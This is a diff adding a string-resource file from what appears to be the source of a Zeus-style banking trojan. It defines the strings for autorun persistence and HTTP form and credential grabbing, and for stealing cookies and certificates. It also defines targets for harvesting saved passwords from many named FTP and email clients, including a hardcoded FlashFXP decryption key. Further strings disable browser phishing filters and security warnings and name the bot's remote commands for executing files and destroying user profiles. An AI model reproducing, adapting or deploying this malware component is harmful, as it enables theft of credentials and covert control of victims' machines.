@@ -1,0 +1,328 @@
+////////////////////////////////////////////////////////////////////////////////////////////////////
+// userhook.cpp
+////////////////////////////////////////////////////////////////////////////////////////////////////
+userhook_screenshot_path_format         "screenshots\\%s\\%04x_%08x.jpg"
+userhook_screenshot_file_default_prefix "unknown"
+userhook_screenshot_format              "image/jpeg"
+
+
+regpath_autorun                     "Software\\Microsoft\\Windows\\Currentversion\\Run"
+regpath_profilelist                 "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\%s"
+regvalue_profilelist_path           "ProfileImagePath"
+
+username_sam_unknown                "unknown\\unknown"
+
+core_uninstall_batch                ":d\r\nrd /S /Q \"%s\"\r\nrd /S /Q \"%s\"\r\nif exist \"%s\" goto d\r\nif exist \"%s\" goto d"
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////
+// httpgrabber.cpp.
+////////////////////////////////////////////////////////////////////////////////////////////////////
+#if(BO_WININET > 0 || BO_NSPR4 > 0)
+httpgrabber_inject_path_format    "grabbed\\%S_%02u_%02u_%02u.txt"
+httpgrabber_inject_grabbed_format "Grabbed data from: %s\n\n%S"
+httpgrabber_report_format         "%s%s\nReferer: %S\nUser input: %s\n%sPOST data:\n\n%S"
+httpgrabber_report_empty          "*EMPTY*"
+httpgrabber_report_unknown        "*UNKNOWN*"
+httpgrabber_report_blocked        " *BLOCKED*"
+httpgrabber_request_ct            "Content-Type: %s\r\n"
+httpgrabber_request_zcid          "ZCID: %S\r\n"
+httpgrabber_urlencoded            "application/x-www-form-urlencoded"
+httpgrabber_auth_normal           "HTTP authentication: username=\"%s\", password=\"%s\"\n"
+httpgrabber_auth_encoded          "HTTP authentication (encoded): %S\n"
+#endif
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////
+// sockethook.cpp.
+////////////////////////////////////////////////////////////////////////////////////////////////////
+#if(BO_SOCKET_FTP > 0 || BO_SOCKET_POP3 > 0)
+sockethook_report_format      "%s://%s:%s@%s/"
+sockethook_report_prefix_ftp  "ftp"
+sockethook_report_prefix_pop3 "pop3"
+sockethook_user_anonymous     "anonymous"
+#endif
+
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////
+// wininethook.cpp. FIXME: названия переменных
+////////////////////////////////////////////////////////////////////////////////////////////////////
+#if(BO_WININET > 0)
+regpath_ie_startpage              "Software\\Microsoft\\Internet Explorer\\Main"
+regvalue_ie_startpage             "Start Page"
+regpath_ie_phishingfilter         "Software\\Microsoft\\Internet Explorer\\PhishingFilter"
+regvalue_ie_phishingfilter1       "Enabled"
+regvalue_ie_phishingfilter2       "EnabledV8"
+regpath_ie_privacy                "Software\\Microsoft\\Internet Explorer\\Privacy"
+regvalue_ie_privacy_cookies       "CleanCookies"
+regpath_ie_zones                  "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\%u"
+regpath_ie_zones_1406             "1406"
+regpath_ie_zones_1609             "1609"
+wininethook_http_acceptencoding   "Accept-Encoding: identity\r\n"
+wininethook_http_te               "TE:\r\n"
+wininethook_http_ifmodified       "If-Modified-Since:\r\n"
+wininethook_report_cookie_path    "\nPath: %s\n"
+wininethook_report_cookie_data    "%s=%s\n"
+file_wininet_cookie_mask          "*@*.txt"
+path_wininet_cookie_low           "Low"
+wininethook_report_cookies        "Wininet(Internet Explorer) cookies:\n%S"
+wininethook_report_cookies_empty  "Empty"
+//FIXME
+#endif
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////
+// nspr4hook.cpp.
+////////////////////////////////////////////////////////////////////////////////////////////////////
+#if(BO_NSPR4 > 0)
+nspr4_firefox_home_path         "Mozilla\\Firefox"
+nspr4_firefox_file_userjs       "user.js"
+nspr4_firefox_file_profiles     "profiles.ini"
+nspr4_firefox_profile_id_format "Profile%u"
+nspr4_firefox_profile_relative  "IsRelative"
+nspr4_firefox_profile_path      "Path"
+nspr4_firefox_prefs_security    "user_pref(\"network.cookie.cookieBehavior\", 0);\r\nuser_pref(\"privacy.clearOnShutdown.cookies\", false);\r\nuser_pref(\"security.warn_viewing_mixed\", false);\r\nuser_pref(\"security.warn_viewing_mixed.show_once\", false);\r\nuser_pref(\"security.warn_submit_insecure\", false);\r\nuser_pref(\"security.warn_submit_insecure.show_once\", false);\r\n"
+nspr4_firefox_prefs_homepage    "user_pref(\"browser.startup.homepage\", \"%s\");\r\nuser_pref(\"browser.startup.page\", 1);\r\n"
+//FIXME
+#endif
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////
+// softwaregrabber.cpp.
+////////////////////////////////////////////////////////////////////////////////////////////////////
+softwaregrabber_flashplayer_path             "Macromedia\\Flash Player"
+softwaregrabber_flashplayer_archive          "flashplayer.cab"
+softwaregrabber_flashplayer_mask             "*.sol"
+#if(BO_SOFTWARE_EMAIL > 0)
+softwaregrabber_wab_title                    "Windows Address Book"
+softwaregrabber_wab_regkey                   "SOFTWARE\\Microsoft\\WAB\\DLLPath"
+softwaregrabber_wab_wabopen                  "WABOpen"
+softwaregrabber_wc_title                     "Windows Contacts"
+softwaregrabber_wc_init_name                 "A8000A"
+softwaregrabber_wc_init_version              "1.0"
+softwaregrabber_wc_property_format           "EmailAddressCollection/EmailAddress[%u]/Address"
+softwaregrabber_windows_mail_recips_title    "Windows Mail Recipients"
+softwaregrabber_outlook_express_recips_title "Outlook Express Recipients"
+softwaregrabber_outlook_express_title        "Outlook Express"
+softwaregrabber_windows_mail_file_1          "account{*}.oeaccount"
+softwaregrabber_windows_mail_regkey           "Software\\Microsoft\\Windows Mail"
+softwaregrabber_windows_live_mail_regkey     "Software\\Microsoft\\Windows Live Mail"
+softwaregrabber_windows_mail_regvalue_path   "Store Root"
+softwaregrabber_windows_mail_regvalue_salt   "Salt"
+softwaregrabber_windows_mail_to_port         "0x%s"
+softwaregrabber_windows_mail_title           "Windows Mail"
+softwaregrabber_windows_live_mail_title      "Windows Live Mail"
+softwaregrabber_windows_mail_xml_root        "MessageAccount"
+softwaregrabber_windows_mail_xml_name        "Account_Name"
+softwaregrabber_windows_mail_xml_email       "SMTP_Email_Address"
+softwaregrabber_account_title                "%sAccount name: %s\nE-mail: %s\n"
+softwaregrabber_account_server_info          "%s:\n\tServer: %s:%u%s\n\tUsername: %s\n\tPassword: %s\n"
+softwaregrabber_account_server_x_server      "%s_Server";
+softwaregrabber_account_server_x_username    "%s_User_Name";
+softwaregrabber_account_server_x_password    "%s_Password2";
+softwaregrabber_account_server_x_port        "%s_Port";
+softwaregrabber_account_server_x_ssl         "%s_Secure_Connection";
+softwaregrabber_account_server_smtp          "SMTP"
+softwaregrabber_account_server_pop3          "POP3"
+softwaregrabber_account_server_imap          "IMAP"
+softwaregrabber_account_server_ssl           " (SSL)"
+#endif
+#if(BO_SOFTWARE_FTP > 0)
+softwaregrabber_ftp_report_format1W          "ftp://%s:%s@%s:%u\n"
+softwaregrabber_ftp_report_format2W          "ftp://%s:%s@%s\n"
+softwaregrabber_ftp_report_format1A          "ftp://%S:%S@%S:%u\n"
+softwaregrabber_flashfxp_secret              "yA36zA48dEhfrvghGRg57h5UlDv3"
+softwaregrabber_flashfxp_file_1              "sites.dat"
+softwaregrabber_flashfxp_file_2              "quick.dat"
+softwaregrabber_flashfxp_file_3              "history.dat"
+softwaregrabber_flashfxp_host                "IP"
+softwaregrabber_flashfxp_port                "port"
+softwaregrabber_flashfxp_user                "user"
+softwaregrabber_flashfxp_pass                "pass"
+softwaregrabber_flashfxp_regkey              "SOFTWARE\\FlashFXP\\3"
+softwaregrabber_flashfxp_regvalue            "datafolder"
+softwaregrabber_flashfxp_path_mask           "*flashfxp*"
+softwaregrabber_flashfxp_title               "FlashFXP"
+softwaregrabber_tc_file_1                    "wcx_ftp.ini"
+softwaregrabber_tc_section_bad_1             "connections"
+softwaregrabber_tc_section_bad_2             "default"
+softwaregrabber_tc_host                      "host"
+softwaregrabber_tc_user                      "username"
+softwaregrabber_tc_pass                      "password"
+softwaregrabber_tc_regkey                    "SOFTWARE\\Ghisler\\Total Commander"
+softwaregrabber_tc_regvalue_ftp              "ftpininame"
+softwaregrabber_tc_regvalue_dir              "installdir"
+softwaregrabber_tc_path_mask_1               "*totalcmd*"
+softwaregrabber_tc_path_mask_2               "*total*commander*"
+softwaregrabber_tc_path_mask_3               "*ghisler*"
+softwaregrabber_tc_title                     "Total Commander"
+softwaregrabber_wsftp_file_1                 "ws_ftp.ini"
+softwaregrabber_wsftp_section_bad_1          "_config_"
+softwaregrabber_wsftp_host                   "HOST"
+softwaregrabber_wsftp_port                   "PORT"
+softwaregrabber_wsftp_user                   "UID"
+softwaregrabber_wsftp_pass                   "PWD"
+softwaregrabber_wsftp_regkey                 "SOFTWARE\\ipswitch\\ws_ftp"
+softwaregrabber_wsftp_regvalue               "datadir"
+softwaregrabber_wsftp_path_mask_1            "*ipswitch*"
+softwaregrabber_wsftp_title                  "WS_FTP"
+softwaregrabber_filezilla_file_mask_1        "*.xml"
+softwaregrabber_filezilla_node_mask          "/*/*/Server"
+softwaregrabber_filezilla_host               "Host"
+softwaregrabber_filezilla_port               "Port"
+softwaregrabber_filezilla_user               "User"
+softwaregrabber_filezilla_pass               "Pass"
+softwaregrabber_filezilla_path_mask_1        "*filezilla*"
+softwaregrabber_filezilla_title              "FileZilla"
+softwaregrabber_far_regkey_1                 "SOFTWARE\\Far\\Plugins\\ftp\\hosts"
+softwaregrabber_far_regkey_2                 "SOFTWARE\\Far2\\Plugins\\ftp\\hosts"
+softwaregrabber_far_host                     "hostname"
+softwaregrabber_far_user_1                   "username"
+softwaregrabber_far_user_2                   "user"
+softwaregrabber_far_pass                     "password"
+softwaregrabber_far_title                    "FAR manager"
+softwaregrabber_winscp_regkey                "SOFTWARE\\martin prikryl\\winscp 2\\sessions"
+softwaregrabber_winscp_host                  "hostname"
+softwaregrabber_winscp_port                  "portnumber"
+softwaregrabber_winscp_user                  "username"
+softwaregrabber_winscp_pass                  "password"
+softwaregrabber_winscp_title                 "WinSCP"
+softwaregrabber_fc_file_1                    "ftplist.txt"
+softwaregrabber_fc_host                      ";server="
+softwaregrabber_fc_port                      ";port="
+softwaregrabber_fc_user                      ";user="
+softwaregrabber_fc_pass                      ";password="
+softwaregrabber_fc_path_mask_1               "ftp*commander*"
+softwaregrabber_fc_title                     "FTP Commander"
+softwaregrabber_coreftp_regkey               "SOFTWARE\\ftpware\\coreftp\\sites"
+softwaregrabber_coreftp_host                 "host"
+softwaregrabber_coreftp_port                 "port"
+softwaregrabber_coreftp_user                 "user"
+softwaregrabber_coreftp_pass                 "pw"
+softwaregrabber_coreftp_title                "CoreFTP"
+softwaregrabber_smartftp_file_mask_1         "*.xml"
+softwaregrabber_smartftp_node                "FavoriteItem"
+softwaregrabber_smartftp_host                "Host"
+softwaregrabber_smartftp_port                "Port"
+softwaregrabber_smartftp_user                "User"
+softwaregrabber_smartftp_pass                "Password"
+softwaregrabber_smartftp_regkey_1            "SOFTWARE\\smartftp\\client 2.0\\settings\\general\\favorites"
+softwaregrabber_smartftp_regvalue_1          "personal favorites"
+softwaregrabber_smartftp_regkey_2            "SOFTWARE\\smartftp\\client 2.0\\settings\\backup"
+softwaregrabber_smartftp_regvalue_2          "folder"
+softwaregrabber_smartftp_title               "SmartFTP"
+#endif
+
+////////////////////////////////////////////////////////////////////////////////////////////////////
+// vnc\*.
+////////////////////////////////////////////////////////////////////////////////////////////////////
+#if(BO_VNC > 0)
+vnc_rootprocess "userinit.exe"
+//FIXME
+#endif
+
+////////////////////////////////////////////////////////////////////////////////////////////////////
+// certstore.cpp.
+////////////////////////////////////////////////////////////////////////////////////////////////////
+certstore_export_password           "pass"
+certstore_export_remote_path        "certs\\%s\\%s_%02u_%02u_%04u.pfx"
+certstore_export_prolog             "grabbed"
+
+////////////////////////////////////////////////////////////////////////////////////////////////////
+// remotescript.cpp.
+////////////////////////////////////////////////////////////////////////////////////////////////////
+remotescript_command_os_shutdown             "os_shutdown"
+remotescript_command_os_reboot               "os_reboot"  
+remotescript_command_bot_uninstall           "bot_uninstall"
+remotescript_command_bot_update              "bot_update"
+#if(BO_BCSERVER_PLATFORMS > 0)
+remotescript_command_bot_bc_add              "bot_bc_add"
+remotescript_command_bot_bc_remove           "bot_bc_remove"
+#endif
+remotescript_command_bot_httpinject_disable  "bot_httpinject_disable"
+remotescript_command_bot_httpinject_enable   "bot_httpinject_enable"
+remotescript_command_fs_path_get             "fs_path_get"
+remotescript_command_fs_search_add           "fs_search_add"
+remotescript_command_fs_search_remove        "fs_search_remove"
+remotescript_command_user_destroy            "user_destroy"
+remotescript_command_user_logoff             "user_logoff"
+remotescript_command_user_execute            "user_execute"
+#if(BO_WININET > 0 || BO_NSPR4 > 0)
+remotescript_command_user_cookies_get        "user_cookies_get"
+remotescript_command_user_cookies_remove     "user_cookies_remove"
+#endif
+remotescript_command_user_certs_get          "user_certs_get"
+remotescript_command_user_certs_remove       "user_certs_remove"
+#if(BO_WININET > 0 || BO_NSPR4 > 0)
+remotescript_command_user_url_block          "user_url_block"
+remotescript_command_user_url_unblock        "user_url_unblock"
+#endif
+#if(BO_WININET > 0 || BO_NSPR4 > 0)
+remotescript_command_user_homepage_set       "user_homepage_set"
+#endif
+#if(BO_SOFTWARE_FTP > 0)
+remotescript_command_user_ftpclients_get     "user_ftpclients_get"
+#endif
+#if(BO_SOFTWARE_EMAIL > 0)
+remotescript_command_user_emailclients_get   "user_emailclients_get"
+#endif
+remotescript_command_user_flashplayer_get    "user_flashplayer_get"
+remotescript_command_user_flashplayer_remove "user_flashplayer_remove"
+
+//Ошибки.
+remotescript_error_not_enough_memory         "Not enough memory."
+remotescript_error_already_executed          "Script already executed."
+remotescript_error_failed_to_load            "Failed to load local configuration."
+remotescript_error_failed_to_save            "Failed to save local configuration."
+remotescript_error_command_failed            "Failed to execute command at line %u."
+remotescript_error_command_unknown           "Unknown command at line %u."
+remotescript_error_success                   "OK."
+
+////////////////////////////////////////////////////////////////////////////////////////////////////
+// windowstation.cpp.
+////////////////////////////////////////////////////////////////////////////////////////////////////
+#if(BO_VNC > 0)
+windowstation_winstation_0    "Winsta0"
+windowstation_desktop_default "default"
+#endif
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////
+// core.cpp FIXME
+////////////////////////////////////////////////////////////////////////////////////////////////////
+core_pr_dwm                   "dwm.exe"
+core_pr_taskhost              "taskhost.exe"
+core_pr_taskeng               "taskeng.exe"
+core_pr_wscntfy               "wscntfy.exe"
+core_pr_ctfmon                "ctfmon.exe"
+core_pr_rdpclip               "rdpclip.exe"
+core_pr_explorer              "explorer.exe"
+core_infobox_botinfo          "V\t%08X\r\nC\t%08X\r\nPS\t%08X"
+core_infobox_crypt_protection "BOT NOT CRYPTED!"
+core_botid_regkey             "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
+core_botid_regvalue_1         "InstallDate"
+core_botid_regvalue_2         "DigitalProductId"
+core_botid_format             "%s_%08X%08X"
+core_botid_format_error       "fatal_error"
+core_botid_unknown            "unknown"
+
+////////////////////////////////////////////////////////////////////////////////////////////////////
+// Модули и их функции.
+////////////////////////////////////////////////////////////////////////////////////////////////////
+module_wtsapi32                     "wtsapi32.dll"
+wtsapi32_enumeratesessions          "WTSEnumerateSessionsW"
+wtsapi32_freememory                 "WTSFreeMemory"
+wtsapi32_queryusertoken             "WTSQueryUserToken"
+
+module_userenv                      "userenv.dll"
+userenv_getdefuserprofiledir        "GetDefaultUserProfileDirectoryW"
+
+module_user32                       "user32.dll"
+user32_messagebox                   "MessageBoxW"
+
+module_ntdll                        "ntdll.dll"
